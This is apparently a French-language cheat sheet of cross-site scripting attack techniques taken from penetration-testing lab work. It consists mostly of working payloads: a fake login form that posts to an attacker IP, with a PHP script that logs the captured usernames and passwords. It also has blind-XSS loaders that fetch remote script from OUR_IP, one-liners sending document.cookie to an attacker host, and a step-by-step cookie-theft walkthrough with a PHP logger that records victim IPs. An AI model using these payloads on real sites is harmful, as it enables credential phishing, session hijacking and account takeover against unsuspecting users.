
```
<script>alert(window.origin)</script>
<iframe src=file:///flag.txt></iframe>
```

https://github.com/payloadbox/xss-payload-list

# XssStrike

```
python xsstrike.py -u 'http://83.136.255.40:49597/?fullname=nhj&username=jhk&password=jl&email=lkl@gmail.com'
```

# Formulaire de connexion

```
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

Exemple :
```
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

Serveur sur la machine kali :
```
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

# XSS aveugle

```
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

```
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

## Explication vole de cookie

1. Découvrir quel payload fonctionne.
2. Créer un fichier javascript
```
cat cookie.js
new Image().src='http://10.10.14.119:8000/cookie.php?c='+document.cookie;
# IP de la machine kali et port du serveur php
```
3. Lancer un serveur python dans le même dossier que cookie.js
4. Créer un fichier php
```
cat cookie.php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
5. Lancer un serveur php dans le même dossier `php -S 0.0.0.0:8000`
6. Utiliser la charge utile, exemple :
```
"><script%20src='http://10.10.14.119/cookie.js'></script> 
```

# Obtenir un retour sans IP public

www.postb.in